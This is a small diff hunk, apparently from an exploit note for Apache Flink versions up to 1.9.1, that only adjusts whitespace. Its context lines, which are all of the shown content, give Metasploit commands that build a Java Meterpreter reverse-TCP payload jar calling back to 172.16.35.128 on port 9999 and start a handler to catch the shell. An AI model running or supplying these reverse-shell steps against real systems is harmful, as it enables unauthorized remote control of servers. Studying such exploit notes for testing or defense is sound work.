@@ -24,7 +24,7 @@ Flink <= 1.9.1
 msfvenom -p java/meterpreter/reverse_tcp lhost=172.16.35.128 lport=9999 -o text.jar  
 msfconsole  
 use exploit/multi/handler  
-set payload java/meterpreter/reverse_tcp
+set payload java/meterpreter/reverse_tcp  
 set lhost 172.16.35.128  
 set lport 9999  
 run  
